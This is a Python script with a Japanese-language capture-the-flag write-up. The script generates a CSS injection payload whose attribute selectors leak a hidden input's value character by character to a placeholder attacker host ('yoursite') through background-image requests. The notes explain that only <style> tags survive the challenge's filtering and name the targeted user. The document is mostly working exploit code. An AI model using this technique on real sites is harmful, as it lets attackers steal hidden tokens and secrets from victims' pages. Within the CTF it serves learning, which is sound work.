import pyperclip

URL: str = "yoursite"

def generate_attack_vector(known_secret: str):
    attack_vector_tmpl: str = "input[name=flag][value^='{known_secret}{try_secret}']{{ background: url('{url}?secret={known_secret}{try_secret}') }}"
    attack_vector: str = ""
    for secret_param in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}_!?":
        attack_vector += attack_vector_tmpl.format(url=URL,
                                                   known_secret=known_secret,
                                                   try_secret=secret_param)
    attack_vector = "<style>" + attack_vector + "</style>"
    pyperclip.copy(attack_vector)

generate_attack_vector("CTF{")


'''

# 前提知識

- CSS Injection

# 解説

軽く試した感じSQLi対策はされてる。  
フォームの入力欄にタグ入れてみたけど、そのまま出てくる。  
セッションの中身を見るとFlaskの形式だった。  
だが、中身に使えそうな情報もなかったので、セッション書き換えではなさそう。

うーん。なぜか<style></style>だけ有効になる！  
（Express your styleだから？）  
CSS Injectionで攻撃できる。

ログイン後画面のソースコードを見ると、  
`<input type="hidden" name="flag" value=Try reading this value>`  
とある。  
なるほど、このvalueをCSS Injectionで抜いていけばいいのね。

攻撃対象は、Sheldonなので、この人に対してCSS Injectionを仕掛けていく。

'''